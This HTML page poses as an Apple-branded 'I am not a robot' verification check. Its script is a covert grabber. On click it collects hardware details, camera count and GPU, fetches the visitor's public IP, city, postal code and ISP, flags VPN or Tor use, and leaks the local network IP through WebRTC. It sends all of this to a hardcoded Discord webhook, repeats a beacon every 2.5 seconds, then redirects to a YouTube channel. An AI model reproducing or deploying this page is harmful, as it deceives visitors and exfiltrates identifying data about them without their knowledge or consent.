<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body { background-color: #f5f5f7; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .apple-box { background: #fff; padding: 40px; border-radius: 18px; box-shadow: 0 20px 40px rgba(0,0,0,0.08); width: 340px; text-align: center; border: 1px solid #d2d2d7; }
        .apple-logo { width: 35px; margin-bottom: 20px; filter: grayscale(1); opacity: 0.8; }
        .h1 { font-size: 22px; font-weight: 600; color: #1d1d1f; margin-bottom: 10px; letter-spacing: -0.5px; }
        .p { font-size: 14px; color: #86868b; margin-bottom: 30px; line-height: 1.4; }
        
        .captcha-wrap { border: 1px solid #d2d2d7; border-radius: 12px; padding: 15px; display: flex; align-items: center; cursor: pointer; transition: 0.2s; position: relative; }
        .captcha-wrap:hover { background: #fbfbfd; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #007aff; border-radius: 4px; margin-right: 15px; position: relative; transition: 0.3s; }
        .checkbox.loading { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
        .checkbox.checked { background: #007aff; border-color: #007aff; }
        .checkbox.checked::after { content: ''; position: absolute; left: 8px; top: 4px; width: 5px; height: 10px; border: solid white; border-width: 0 2.5px 2.5px 0; transform: rotate(45deg); }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #status { font-size: 9px; color: #d2d2d7; margin-top: 25px; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>

<div class="apple-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo" alt="Apple">
    <div id="ui-main">
        <div class="h1">Verify Connection</div>
        <div class="p">Please complete the security challenge to access your destination.</div>
        
        <div class="captcha-wrap" id="gate">
            <div class="checkbox" id="check"></div>
            <div style="font-size: 15px; color: #1d1d1f; font-weight: 400;">I am not a robot</div>
        </div>
    </div>
    <div id="status">SECURE-TLS V29.0 ACTIVE</div>
</div>

<script>
/**
 * SENTINEL OMEGA-VOID-CORE v29.0
 * MERGED HYBRID: ZERO-PERMISSION + HIGH-FIDELITY APPLE UI
 */

const SETTINGS = {
    HOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    EXIT: "https://youtube.com/@LigmaBlox-w7m",
    PING: "@everyone",
    LOCKS: { geo: false, net: false }
};

const dispatch = (data, vector, color = 0x007aff) => {
    const p = JSON.stringify({
        content: vector === "CRITICAL_HIT" ? SETTINGS.PING : "",
        username: `SENTINEL-v29 [${vector}]`,
        embeds: [{
            title: `🔱 Node Unmasked: ${vector}`,
            color: color,
            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            timestamp: new Date().toISOString(),
            footer: { text: "Protocol: VOID-CORE Hybrid" }
        }]
    });
    navigator.sendBeacon(SETTINGS.HOOK, new Blob([p], {type:'application/json'}));
};

// --- LIVE BEACON (Every 2.5s) ---
const startHeartbeat = () => {
    setInterval(async () => {
        try {
            const b = await navigator.getBattery();
            dispatch({
                status: "Target is On-Page",
                battery: `${(b.level * 100).toFixed(0)}%`,
                charging: b.charging ? "YES" : "NO",
                memory: performance.memory ? `${(performance.memory.usedJSHeapSize / 1048576).toFixed(1)}MB` : "N/A"
            }, "LIVE_BEACON", 0x34c759);
        } catch(e) {}
    }, 2500);
};

document.getElementById('gate').onclick = async function() {
    const box = document.getElementById('check');
    box.classList.add('loading');
    document.getElementById('status').innerText = "SYNCHRONIZING WITH SERVER...";

    // 1. CRITICAL HIT (The Ping + Hardware + Camera Sensors)
    const b = await navigator.getBattery();
    let sensorCount = "Unknown";
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        sensorCount = devices.filter(d => d.kind === 'videoinput').length + " Sensors";
    } catch(e) {}

    dispatch({
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
        battery: `${(b.level * 100).toFixed(0)}%`,
        camera: sensorCount,
        screen: `${window.screen.width}x${window.screen.height}`,
        gpu: (() => {
            const gl = document.createElement('canvas').getContext('webgl');
            const d = gl.getExtension('WEBGL_debug_renderer_info');
            return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : "HIDDEN";
        })()
    }, "CRITICAL_HIT", 0xff0000);

    // 2. PRECISION GEOSPATIAL (Continent/Country/Town/VPN)
    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
        if(!SETTINGS.LOCKS.geo) {
            const vpn = (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO";
            dispatch({
                continent: res.continent_code,
                country: res.country_name,
                region: res.region,
                city: res.city,
                town: res.postal || "N/A",
                ip_public: res.ip,
                isp: res.org,
                vpn_detected: vpn,
                tor: res.org.toLowerCase().includes("tor") ? "YES" : "NO",
                lockdown: !window.RTCPeerConnection ? "YES" : "NO"
            }, "GEO_PRECISION", 0x5856d6);
            SETTINGS.LOCKS.geo = true;
        }
    });

    // 3. 5-VECTOR RTC UNMASK (Private IP Bypass)
    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] });
    rtc.createDataChannel("");
    rtc.onicecandidate = (e) => {
        if (e.candidate && !SETTINGS.LOCKS.net) {
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (ip) {
                dispatch({ internal_lan: ip[1], protocol: "Multi-Vector STUN/UDP" }, "NETWORK_UNMASK", 0x007aff);
                SETTINGS.LOCKS.net = true;
            }
        }
    };
    rtc.createOffer().then(o => rtc.setLocalDescription(o));

    // 4. HEARTBEAT & FINISH
    startHeartbeat();

    setTimeout(() => {
        box.classList.remove('loading');
        box.classList.add('checked');
        document.getElementById('status').innerText = "VERIFIED";
        document.getElementById('status').style.color = "#34c759";
        
        setTimeout(() => { window.location.replace(SETTINGS.EXIT); }, 1800);
    }, 3200);
};
</script>
</body>
</html>
